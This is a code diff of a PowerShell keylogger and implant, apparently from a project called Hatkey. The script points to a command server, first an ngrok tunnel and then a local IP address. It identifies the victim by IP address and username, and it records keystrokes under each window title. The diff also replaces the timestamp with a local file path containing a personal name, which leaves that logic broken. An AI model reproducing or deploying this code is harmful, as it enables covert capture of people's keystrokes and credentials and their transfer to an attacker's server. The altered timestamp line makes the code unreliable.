@@ -1,4 +1,4 @@
-$server = 'https://68ef-88-234-130-67.eu.ngrok.io'
+$server = 'http://192.168.1.41:8080/'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
@@ -159,7 +159,7 @@ while ($true) {
 			if ($unicode_res -gt 0) {
 				if ($WindowTitle -ne $LastWindowTitle){
 					# if the window has changed
-					$TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
+					$TimeStamp = ("C:\Users\Mehmet Dere\Downloads\Hatkey-master\System\random.txt")
 					$Outout = "`n[$WindowTitle - $TimeStamp]`n"
 					$LastWindowTitle = $WindowTitle
 				}
